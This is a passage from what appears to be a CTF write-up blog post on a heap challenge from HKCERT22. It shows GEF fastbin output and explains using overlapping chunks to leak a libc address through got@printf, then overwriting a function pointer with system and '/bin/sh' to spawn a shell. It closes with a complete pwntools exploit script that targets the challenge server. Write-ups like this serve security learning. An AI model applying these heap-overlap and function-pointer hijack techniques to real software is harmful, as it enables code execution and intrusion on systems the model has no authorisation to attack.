style="color:#f92672">=</span>PREV_INUSE<span style="color:#f92672">)</span>  ←  Chunk<span style="color:#f92672">(</span>addr<span style="color:#f92672">=</span>0xc772c0, size<span style="color:#f92672">=</span>0x20, flags<span style="color:#f92672">=</span>PREV_INUSE<span style="color:#f92672">)</span> 
───────────────────────────────── Fastbins <span style="color:#66d9ef">for</span> arena at 0x7f17eea04c80 ─────────────────────────────────
Fastbins<span style="color:#f92672">[</span>idx<span style="color:#f92672">=</span>0, size<span style="color:#f92672">=</span>0x20<span style="color:#f92672">]</span>  ←  Chunk<span style="color:#f92672">(</span>addr<span style="color:#f92672">=</span>0xc77360, size<span style="color:#f92672">=</span>0x20, flags<span style="color:#f92672">=</span>PREV_INUSE<span style="color:#f92672">)</span> 
Fastbins<span style="color:#f92672">[</span>idx<span style="color:#f92672">=</span>1, size<span style="color:#f92672">=</span>0x30<span style="color:#f92672">]</span> 0x00
Fastbins<span style="color:#f92672">[</span>idx<span style="color:#f92672">=</span>2, size<span style="color:#f92672">=</span>0x40<span style="color:#f92672">]</span> 0x00
Fastbins<span style="color:#f92672">[</span>idx<span style="color:#f92672">=</span>3, size<span style="color:#f92672">=</span>0x50<span style="color:#f92672">]</span> 0x00
Fastbins<span style="color:#f92672">[</span>idx<span style="color:#f92672">=</span>4, size<span style="color:#f92672">=</span>0x60<span style="color:#f92672">]</span> 0x00
Fastbins<span style="color:#f92672">[</span>idx<span style="color:#f92672">=</span>5, size<span style="color:#f92672">=</span>0x70<span style="color:#f92672">]</span> 0x00
Fastbins<span style="color:#f92672">[</span>idx<span style="color:#f92672">=</span>6, size<span style="color:#f92672">=</span>0x80<span style="color:#f92672">]</span> 0x00
─────────────────────────────── Unsorted Bin <span style="color:#66d9ef">for</span> arena at 0x7f17eea04c80 ───────────────────────────────
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> chunks in unsorted bin.
──────────────────────────────── Small Bins <span style="color:#66d9ef">for</span> arena at 0x7f17eea04c80 ────────────────────────────────
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> chunks in <span style="color:#ae81ff">0</span> small non-empty bins.
──────────────────────────────── Large Bins <span style="color:#66d9ef">for</span> arena at 0x7f17eea04c80 ────────────────────────────────
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> chunks in <span style="color:#ae81ff">0</span> large non-empty bins.

</code></pre></div><p>Afterwards, we can use <code>add_animal</code> again to create a overlap chunk and we can put the <code>speak</code> and <code>got@printf</code> inside the overlap for the libc address leakage by <code>report_name</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">speak <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;speak&#39;</span>]
got_printf <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;printf&#39;</span>]

payload <span style="color:#f92672">=</span> p64(speak) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(got_printf)

add(<span style="color:#ae81ff">1</span>, payload) <span style="color:#75715e"># 4</span>

report(<span style="color:#ae81ff">2</span>)
ru(<span style="color:#e6db74">&#34;: &#34;</span>)

libc_base <span style="color:#f92672">=</span> u64(r(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x60770</span>
leak(<span style="color:#e6db74">&#34;libc_base&#34;</span>, libc_base)
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  tele &amp;zoo
0x000000004040c0│+0x0000: &lt;zoo+0&gt; add DWORD PTR <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, eax
0x000000004040c8│+0x0008: 0x000000011522a0  →  0x00000001153392  →  0x0000000000000000
0x000000004040d0│+0x0010: 0x000000011522e0  →  0x00000001153252  →  0x0000000000000000
0x000000004040d8│+0x0018: 0x00000001152320  →  0x000000004012b3  →  &lt;speak+0&gt; endbr64 
0x000000004040e0│+0x0020: 0x00000001152360  →  0x0000000000001152
0x000000004040e8│+0x0028: 0x00000001152380  →  0x000000004012b3  →  &lt;speak+0&gt; endbr64 

gef➤  tele 0x00000001152320
0x00000001152320│+0x0000: 0x000000004012b3  →  &lt;speak+0&gt; endbr64 
0x00000001152328│+0x0008: 0x0000000000000000
0x00000001152330│+0x0010: 0x00000000404040  →  0x007fb77d78a770  →  &lt;printf+0&gt; endbr64 

</code></pre></div><p>Finally, we put the system and &ldquo;/bin/sh&rdquo; address into the payload and create overlap chunks and get the shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">libc_base <span style="color:#f92672">=</span> u64(r(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x60770</span>
leak(<span style="color:#e6db74">&#34;libc_base&#34;</span>, libc_base)

system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
binsh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
payload <span style="color:#f92672">=</span> p64(system) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(binsh)
add(<span style="color:#ae81ff">1</span>, payload)
add(<span style="color:#ae81ff">1</span>, payload)

add(<span style="color:#ae81ff">1</span>, payload)
report(<span style="color:#ae81ff">1</span>)
</code></pre></div><h3 id="full-exploit-2">Full exploit</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chal.hkcert22.pwnable.hk&#39;</span>
PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">28236</span>
context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span> <span style="color:#75715e"># i386/amd64</span>
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>,<span style="color:#e6db74">&#39;splitw&#39;</span>,<span style="color:#e6db74">&#39;-h&#39;</span>]
elf <span style="color:#f92672">=</span> ELF(TARGET)

<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
    p <span style="color:#f92672">=</span> remote(HOST, PORT)
    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
<span style="color:#66d9ef">else</span>:
    p <span style="color:#f92672">=</span> process(TARGET)
    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
    gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;gdb&#39;</span>:
       gdb<span style="color:#f92672">.</span>attach(p, gdbscript<span style="color:#f92672">=</span>gdbscript)

<span style="color:#75715e">#--- helper functions</span>
s       <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :p<span style="color:#f92672">.</span>send(data)        
sa      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :p<span style="color:#f92672">.</span>sendafter(delim, data) 
sl      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :p<span style="color:#f92672">.</span>sendline(data) 
sla     <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :p<span style="color:#f92672">.</span>sendlineafter(delim, data) 
r       <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> numb<span style="color:#f92672">=</span><span style="color:#ae81ff">4096</span>          :p<span style="color:#f92672">.</span>recv(numb)
ru      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delims, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>  :p<span style="color:#f92672">.</span>recvuntil(delims, drop)
<span style="color:#75715e"># misc functions</span>
uu32    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data   :u32(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
uu64    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data   :u64(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
leak    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> name,addr :log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> = </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(name, addr))
<span style="color:#75715e">#---</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(index, name):
    sla(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>)
    sla(<span style="color:#e6db74">&#34;&gt;&#34;</span>, str(index))
    sla(<span style="color:#e6db74">&#34;Name of animal?&#34;</span>, name)
    
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove</span>(index):
    sla(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
    sla(<span style="color:#e6db74">&#34;Zone number? (0-9)&#34;</span>, str(index))
    
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">report</span>(index):
    sla(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
    sla(<span style="color:#e6db74">&#34;Zone number? (0-9)&#34;</span>, str(index))

add(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span>) <span style="color:#75715e"># 0</span>
add(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span>) <span style="color:#75715e"># 1</span>
add(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span>) <span style="color:#75715e"># 2</span>
add(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;D&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span>) <span style="color:#75715e"># 3</span>
remove(<span style="color:#ae81ff">0</span>)
remove(<span style="color:#ae81ff">1</span>)
remove(<span style="color:#ae81ff">2</span>)
remove(<span style="color:#ae81ff">3</span>)

speak <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;speak&#39;</span>]
got_printf <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;printf&#39;</span>]

payload <span style="color:#f92672">=</span> p64(speak) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(got_printf)

add(<span style="color:#ae81ff">1</span>, payload) <span style="color:#75715e"># 4</span>

report(<span style="color:#ae81ff">2</span>)
ru(<span style="color:#e6db74">&#34;: &#34;</span>)

libc_base <span style="color:#f92672">=</span> u64(r(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x60770</span>
leak(<span style="color:#e6db74">&#34;libc_base&#34;</span>, libc_base)

system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
binsh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
payload <span style="color:#f92672">=</span> p64(system) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(binsh)
add(<span style="color:#ae81ff">1</span>, payload)
add(<span style="color:#ae81ff">1</span>, payload)

add(<span style="color:#ae81ff">1</span>, payload)
report(<span style="color:#ae81ff">1</span>)

p<span style="color:#f92672">.</span>interactive()
</code></pre></div></div>
</article>

    <hr />
    <p class="articleTagsContainer">
        <span> </span>
        <strong>Tags:</strong>
        
            <a
                
                href="/tags/ctf">#ctf</a>
        
    </p>






                    </main><footer>
    <hr />

<p><small>
        2023 &copy; Some copyright notice - <a href="https://example.com/license">my license</a>
    </small></p>
    <p><small>
        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
